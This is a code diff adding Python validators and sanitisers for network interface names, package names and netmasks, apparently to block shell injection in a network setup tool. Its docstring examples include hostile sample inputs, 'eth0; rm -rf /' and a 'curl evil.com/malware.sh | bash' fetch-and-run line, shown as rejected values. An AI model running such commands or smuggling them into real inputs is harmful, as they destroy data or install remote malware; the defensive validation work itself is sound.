@@ -279,3 +279,166 @@ def validate_email(email: str) -> bool:
     """
     pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
     return bool(re.match(pattern, email))
+
+
+def is_valid_interface_name(interface: str) -> bool:
+    """Validate network interface name.
+
+    Args:
+        interface: Interface name to validate
+
+    Returns:
+        True if valid interface name, False otherwise
+
+    Examples:
+        >>> is_valid_interface_name("eth0")
+        True
+        >>> is_valid_interface_name("wg0")
+        True
+        >>> is_valid_interface_name("eth0; rm -rf /")
+        False
+        >>> is_valid_interface_name("")
+        False
+    """
+    if not interface or len(interface) > 15:  # IFNAMSIZ is 16 in Linux (including null terminator)
+        return False
+
+    # Only alphanumeric, underscore, hyphen, period (common in interface names)
+    pattern = r'^[a-zA-Z0-9._-]+$'
+    return bool(re.match(pattern, interface))
+
+
+def is_valid_package_name(package: str) -> bool:
+    """Validate package name for installation.
+
+    Follows Debian/RPM package naming conventions:
+    - Must start with alphanumeric
+    - Can contain alphanumeric, plus, period, underscore, hyphen
+    - Reasonable length limit
+
+    Args:
+        package: Package name to validate
+
+    Returns:
+        True if valid package name, False otherwise
+
+    Examples:
+        >>> is_valid_package_name("wireguard-tools")
+        True
+        >>> is_valid_package_name("python3-pip")
+        True
+        >>> is_valid_package_name("vim; curl evil.com/malware.sh | bash")
+        False
+        >>> is_valid_package_name("")
+        False
+    """
+    if not package or len(package) > 256:
+        return False
+
+    # Debian/RPM package naming conventions
+    # Must start with alphanumeric, can contain +-._
+    pattern = r'^[a-zA-Z0-9][a-zA-Z0-9+._-]*$'
+    return bool(re.match(pattern, package))
+
+
+def is_valid_netmask(netmask: str) -> bool:
+    """Validate netmask (CIDR notation or dotted decimal).
+
+    Args:
+        netmask: Netmask to validate (e.g., "24" or "255.255.255.0")
+
+    Returns:
+        True if valid netmask, False otherwise
+
+    Examples:
+        >>> is_valid_netmask("24")
+        True
+        >>> is_valid_netmask("255.255.255.0")
+        True
+        >>> is_valid_netmask("99")
+        False
+        >>> is_valid_netmask("invalid")
+        False
+    """
+    # Check if CIDR notation (e.g., "24")
+    try:
+        mask = int(netmask)
+        return 0 <= mask <= 32  # Valid range for IPv4 CIDR
+    except ValueError:
+        pass
+
+    # Check if dotted decimal (e.g., "255.255.255.0")
+    if is_valid_ipv4(netmask):
+        # Verify it's actually a valid netmask (not just any IP)
+        try:
+            addr = ipaddress.IPv4Address(netmask)
+            # Convert to int and check if it's a valid netmask pattern
+            # Valid netmasks have consecutive 1s followed by consecutive 0s
+            mask_int = int(addr)
+            # Check if it's a valid netmask by ensuring no gaps in the binary representation
+            # e.g., 255.255.255.0 = 0xFFFFFF00 is valid
+            # but 255.255.0.255 = 0xFFFF00FF is invalid
+            if mask_int == 0:
+                return True  # 0.0.0.0 is technically valid
+            # Find first 0 bit
+            inverted = ~mask_int & 0xFFFFFFFF
+            # Check if inverted+1 is a power of 2 (means all 1s are consecutive)
+            return (inverted & (inverted + 1)) == 0
+        except Exception:
+            return False
+
+    return False
+
+
+def sanitize_interface_name(interface: str) -> str:
+    """Sanitize interface name by removing invalid characters.
+
+    Args:
+        interface: Interface name to sanitize
+
+    Returns:
+        Sanitized interface name
+
+    Examples:
+        >>> sanitize_interface_name("eth0")
+        "eth0"
+        >>> sanitize_interface_name("eth 0")
+        "eth0"
+        >>> sanitize_interface_name("wg-0!")
+        "wg-0"
+    """
+    # Remove invalid characters (keep alphanumeric, underscore, hyphen, period)
+    interface = re.sub(r'[^a-zA-Z0-9._-]', '', interface)
+
+    # Limit length to 15 characters (IFNAMSIZ - 1)
+    interface = interface[:15]
+
+    return interface
+
+
+def sanitize_package_name(package: str) -> str:
+    """Sanitize package name by removing invalid characters.
+
+    Args:
+        package: Package name to sanitize
+
+    Returns:
+        Sanitized package name
+
+    Examples:
+        >>> sanitize_package_name("wireguard-tools")
+        "wireguard-tools"
+        >>> sanitize_package_name("vim; malware")
+        "vimmalware"
+    """
+    # Remove all characters except alphanumeric and +-._-
+    package = re.sub(r'[^a-zA-Z0-9+._-]', '', package)
+
+    # Ensure starts with alphanumeric
+    if package and not package[0].isalnum():
+        package = package.lstrip('+._-')
+
+    # Limit length
+    package = package[:256]
+
+    return package
